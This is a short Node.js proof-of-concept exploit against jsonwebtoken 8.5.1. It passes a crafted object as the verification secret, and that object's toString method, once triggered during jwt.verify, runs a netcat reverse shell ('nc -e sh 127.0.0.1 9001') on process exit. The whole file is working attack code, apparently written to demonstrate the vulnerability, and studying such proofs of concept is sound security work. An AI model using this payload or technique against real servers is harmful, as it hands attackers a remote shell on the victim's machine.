// npm install jsonwebtoken@8.5.1
var jwt = require('jsonwebtoken');

// create a token using the servers secret
var token = jwt.sign({"x":"y"}, 'servers_secret');

// create malicious object containing a reverse shell (node.js)
var poisoned_secret_on_server = { 
    toString : ()=> {console.log('PWNED AFTER PASRSING TOKEN');
        process.on('exit', ()=> {
            require('child_process').exec('nc -e sh 127.0.0.1 9001');
        });
        process.exit(0)
    }
}

// Server verifies the token using malicious object stored as secret
jwt.verify(token, poisoned_secret_on_server);
